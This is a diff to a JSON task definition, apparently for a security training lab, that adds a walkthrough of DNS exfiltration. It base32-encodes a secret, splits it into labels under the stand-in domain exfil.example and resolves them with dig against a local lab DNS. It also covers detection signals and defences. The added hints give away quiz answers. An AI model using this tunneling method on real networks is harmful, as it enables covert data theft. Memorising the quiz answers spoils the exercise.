@@ -4,10 +4,20 @@
   "tasks": {
     "1": {
       "title": "Exfiltrate the secret and detect yourself",
+      "body": "## The channel\n\nDNS allows ~253 characters per name and 63 per label. Data\nencoded in base32 (only A-Z, 2-7 — perfectly valid in a\nsubdomain) travels disguised as queries:\n\n```\nc1-knauyrktfvdfsmrxfveu.exfil.example    ← chunk 1\nc2-4vcfkjhectbnj5heywi.exfil.example     ← chunk 2\n```\n\nIn the previous room you saw the idea with a single query; here you do it\nfully: the authoritative server for `exfil.example` (the attacker) receives\neach \"query\", decodes its label and **reassembles** the secret in order.\n`dnscat2` or `iodine` automate this; you'll write your own script.\n\n## The attack, step by step\n\n```bash\n# 1. The secret:\ncurl -s http://127.0.0.1:18112/secret\n\n# 2. Encode and chunk it (python or whatever shell you like):\npython3 -c \"\nimport base64\nenc = base64.b32encode(b'SALES-FY27-INTERNAL-ONLY').decode().rstrip('=').lower()\nprint([enc[i:i+20] for i in range(0, len(enc), 20)])\n\"\n\n# 3. Resolve each chunk against the lab's DNS:\ndig @127.0.0.1 -p 18153 c1-<chunk1>.exfil.example\n# without dig:\ncurl \"http://127.0.0.1:18112/resolve?q=c1-<chunk1>.exfil.example\"\n\n# 4. Check the reassembly:\ncurl -s http://127.0.0.1:18112/status | jq .\n```\n\nOnce the chunks reassemble the exact secret, `/status` hands you the\nflag. You just exfiltrated data from a network without using HTTP, SMTP or any\n\"suspicious\" port.\n\n## The detection: the other side\n\n```bash\ncurl -s http://127.0.0.1:18112/detect | jq .\n```\n\nTwo signals gave the channel away:\n\n1. **Abnormally long labels** (>20 chars) and high entropy under a\n   single domain — legitimate subdomains are short\n   (`www`, `api`, `mail`).\n2. **Volume and variety**: a normal host queries the SAME domains\n   over and over; a tunnel generates thousands of unique names.\n\nIn a real SIEM this is caught with: average label length per domain,\nqname entropy score, NXDOMAIN rate, and more modern — ML\nmodels over DNS traffic (Cisco Umbrella, Elastic DGA rules). The structural\ndefense: DNS egress filtering (only the corporate resolver can\nquery outward) and monitoring TXT/NULL records toward new domains.",
       "questions": {
-        "data-exfiltration-t01-q01": { "prompt": "Encode the /secret blob in base32, split it into labels (c1-, c2-...) and resolve them against the lab DNS. Submit the flag /status gives at exfil_complete." },
-        "data-exfiltration-t01-q02": { "prompt": "As the SOC: after exfiltrating, open /detect. What TYPE are the alerts your channel generated? (the first alert's type)" },
-        "data-exfiltration-t01-q03": { "prompt": "Submit the blue-team flag /detect delivers when correlating the signals." }
+        "data-exfiltration-t01-q01": {
+          "prompt": "Encode the /secret blob in base32, split it into labels (c1-, c2-...) and resolve them against the lab DNS. Submit the flag /status gives at exfil_complete.",
+          "hint": "base32 only uses A-Z and 2-7: valid characters in DNS labels. dig @127.0.0.1 -p 18153 c1-<chunk>.exfil.example (or /resolve?q=)"
+        },
+        "data-exfiltration-t01-q02": {
+          "prompt": "As the SOC: after exfiltrating, open /detect. What TYPE are the alerts your channel generated? (the first alert's type)",
+          "hint": "DNS_TUNNELING — long, high-entropy labels under the same unusual domain"
+        },
+        "data-exfiltration-t01-q03": {
+          "prompt": "Submit the blue-team flag /detect delivers when correlating the signals.",
+          "hint": "The blue_team_flag key appears with 2+ queries of labels >= 20 chars"
+        }
       }
     }
   }
